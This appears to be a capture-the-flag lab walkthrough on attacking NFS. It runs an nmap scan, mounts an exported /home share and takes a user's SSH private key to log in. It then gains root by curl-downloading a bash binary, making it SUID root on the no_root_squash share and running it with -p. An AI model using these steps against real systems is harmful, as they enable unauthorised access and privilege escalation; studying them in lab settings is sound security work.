# NFS

- What is an NFS:
  NDF stands for Network File System. This allows a system to share directories and files with others over a network.
  By using an NFS, users and programs can access files on remote systems. It does this by mounting all or a portion of a filesystem on a server.
  The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.
- How does an NFS work?
  First, the client will request to mount a directory from a remote host on a local directory the same way it can mount a physical drive. The mount service will then act to connect to the relevant mount daemon using RPC.
  The server checks if the user has permission to mount the directory that has been requested. It will then return a file handle which uniquely identifies each file and directory on the server.
  IF someone wants access to a file using NFS, an PRC call is places to NFSD( the NFS daemon ) on the server.
  This call takes parameters such as:
  - The file handle
  - The name of the file to be accessed
  - The users ID
  - The users Group ID.
- What runs NFS?
  Using the NFS protocol, you can transfer files between computers running Windows and, Linux, MacOS, or Unix.
  A computer running Windows server can act as an NFS file server for other non-Windows client computers. Likewise, NFS allows a Windows-based computer running Windows Server to access files stored on a non-Windows NFS server.

## Enumeration

- Now we establish an active conection to the target host to discover potential attach vectors in the system. THis can also be used for further exploitation of the system.

 ### NMAP

  ```bash
  nmap -p- -vv -A -sC -sV -oN nmap/nfs 10.10.x.x
  ```

  - Results:

  ```bash
  # Nmap 7.60 scan initiated Mon May  3 14:21:48 2021 as: nmap -p- -v -A -sC -sV -oN nmap/nfs 10.10.40.190

  Nmap scan report for ip-10-10-40-190.eu-west-1.compute.internal (10.10.40.190)
  Host is up, received arp-response (0.00043s latency).
  Scanned at 2021-05-03 14:21:49 BST for 5672s
  Not shown: 65528 closed ports
  Reason: 65528 resets
  PORT      STATE SERVICE  REASON         VERSION
  22/tcp    open  ssh      syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   2048 73:92:8e:04:de:40:fb:9c:90:f9:cf:42:70:c8:45:a7 (RSA)
  | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEQIafB/d+8xhCVa/WJUjV/xtzU7h9fmdPMEVWEobVN59eusBnBD19rp08xrjFOkvHdLSe3XCaDSSreOd4m9If73vzGT/dpXO4kj2Je+p2ALDLLr0vbA+/EVrFJjsbKJ6OLNWGw2nD6romEld++MLOI0SbY9zaM3ov4hwQZ2Fnp9QF5OAt3zqIyxk5Xr99gpm/i4mk3YtA+3I1WHpdLE5Uw41aOVYapowLh+sG1Uyi8dxnI7WJ04DywrUftJam/ajlY6QAiWDR96QRw7RuNJ+8dOLDj7JT+aNREvSTrSWahn+clpIwCgDuVUYy36BEfyTpC/JyTtuS077Bj8vv8NLl
  |   256 6d:63:d6:b8:0a:67:fd:86:f1:22:30:2b:2d:27:1e:ff (ECDSA)
  |_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIL2RAJwSBEjlVNFa6km4BnXrbfxBqanFGsc8V7KPraGwGaJkBCtaUpVRQmPXQHhNePswl4UI2rsxVLcw/DYQ4s=
  111/tcp   open  rpcbind  syn-ack ttl 64 2-4 (RPC #100000)
  | rpcinfo:
  |   program version   port/proto  service
  |   100000  2,3,4        111/tcp  rpcbind
  |   100000  2,3,4        111/udp  rpcbind
  |   100003  3           2049/udp  nfs
  |   100003  3,4         2049/tcp  nfs
  |   100005  1,2,3      34059/udp  mountd
  |   100005  1,2,3      43613/tcp  mountd
  |   100021  1,3,4      38001/tcp  nlockmgr
  |   100021  1,3,4      40819/udp  nlockmgr
  |   100227  3           2049/tcp  nfs_acl
  |_  100227  3           2049/udp  nfs_acl
  2049/tcp  open  nfs_acl  syn-ack ttl 64 3 (RPC #100227)
  38001/tcp open  nlockmgr syn-ack ttl 64 1-4 (RPC #100021)
  43613/tcp open  mountd   syn-ack ttl 64 1-3 (RPC #100005)
  49461/tcp open  mountd   syn-ack ttl 64 1-3 (RPC #100005)
  53785/tcp open  mountd   syn-ack ttl 64 1-3 (RPC #100005)
  MAC Address: 02:7A:EB:8E:3A:0D (Unknown)
  No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
  TCP/IP fingerprint:
  OS:SCAN(V=7.60%E=4%D=5/3%OT=22%CT=1%CU=35721%PV=Y%DS=1%DC=D%G=Y%M=027AEB%TM
  OS:=60900F15%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=107%TI=Z%CI=Z%TS=A)
  OS:SEQ(SP=100%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M230
  OS:1ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)W
  OS:IN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F
  OS:507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)
  OS:T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%
  OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(
  OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0
  OS:%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

  Uptime guess: 1.704 days (since Sat May  1 23:03:04 2021)
  Network Distance: 1 hop
  TCP Sequence Prediction: Difficulty=256 (Good luck!)
  IP ID Sequence Generation: All zeros
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  TRACEROUTE
  HOP RTT     ADDRESS
  1   0.43 ms ip-10-10-40-190.eu-west-1.compute.internal (10.10.40.190)

  Read data files from: /usr/bin/../share/nmap
  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  # Nmap done at Mon May  3 15:56:21 2021 -- 1 IP address (1 host up) scanned in 5673.17 seconds
  ```

 - Using /usr/sbin/showmount -e IP to list the NFS shares, what is the name of the share we want?
    ```bash
    showmount -e 10.10.x.x
    ```
    - Result: /home

  ### NFS-common

  - This comes with a suite of tools such as:
    - lockd
    - statd
    - snowmount
    - nfsstat
    - gssd
    - idmapd
    - mount.nfs
      > These tools can be installed with _sudo apt install nfs-common_.

  ### Mounting NFS shares

  - The client system needs a directory where all the content shared by the host server in the export folder be accessed. You can create this folder anywhere. Once it's been created, mount it with the **mount** command to connect the NFS share to the mount point on your machine

  ```bash
  sudo mount -t nfs IP:share /tmp/mount/ -nolock
  ```

  | Tag      | Function                                                                     |
  | -------- | ---------------------------------------------------------------------------- |
  | sudo     | Run as root                                                                  |
  | mount    | Execute the mount command                                                    |
  | -t nfs   | Type of device to mount, then specifying that it's NFS                       |
  | IP:share | The IP Address of the NFS server, and the name of the share we wish to mount |
  | -nolock  | Specifies not to use NLM locking                                             |

 
 

  ### Mounting

  - First, make a dir in the /tmp/ location on your machine to mount the share to. The content in the /tmp/ directory will be removed after reboot.
  - Use the previous command to mount that home dir into our temp mount location.

  - What's the name of the folder inside the mounted dir?: **cappucino**
  - Found id_rsa in a .ssh folder.
  - Copied that to our home directory and changed permissions to 600 and connected via SSH successfully as user cappucino.

## Exploitation

Now that we are on the machine as Cappucino, we still do not have root access to the machine.

### Root_squash

- What is root_squash?
  By default, NFS shares have root_squash enabled. This prevents anyone connecting to the NFS share from having root access to the share volume. Remote root users are assiged a user "nfsnobody"
- First we download the bash binary 
```bash
curl https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash?raw=true > bash
```

- Then we moved it to the mounted nfs drive
  * changed the owner to root
  * set the SUID bit with a +s
  * changed permission of bash to 745 (Make sure the S is lowercase)
  * and lastly, executed the shell with persisted permission
    ```bash
    ./bash -p
    ```
- Now we are root on the machine.